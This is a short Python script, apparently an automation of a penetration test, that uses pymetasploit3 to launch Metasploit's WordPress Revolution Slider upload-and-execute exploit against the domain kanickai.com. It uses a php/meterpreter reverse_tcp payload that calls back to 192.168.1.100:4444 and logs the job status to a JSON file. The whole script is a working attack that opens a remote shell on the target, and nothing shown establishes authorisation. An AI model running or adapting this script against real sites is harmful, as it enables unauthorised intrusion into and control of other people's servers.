from pymetasploit3.msfrpc import MsfRpcClient
import json
import datetime

# Connexion RPC (user/pass = msf/test)
client = MsfRpcClient(password='test', port=55553, ssl=False)

exploit = client.modules.use('exploit', 'unix/webapp/wp_revslider_upload_execute')
exploit['RHOSTS'] = 'kanickai.com'
exploit['TARGETURI'] = '/wordpress'
exploit['LHOST'] = '192.168.1.100'
exploit['LPORT'] = 4444
exploit['PAYLOAD'] = 'php/meterpreter/reverse_tcp'

job_id = exploit.execute()

# Récupérer le statut
results = {
    "exploit": exploit.name,
    "target": exploit['RHOSTS'],
    "status": "launched" if job_id else "failed",
    "job_id": job_id
}

# Enregistrer sous JSON
timestamp = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
with open(f"/msf/results/metasploit_result_{timestamp}.json", "w") as f:
    json.dump(results, f, indent=2)

print(f"✅ Résultat enregistré dans results/metasploit_result_{timestamp}.json")
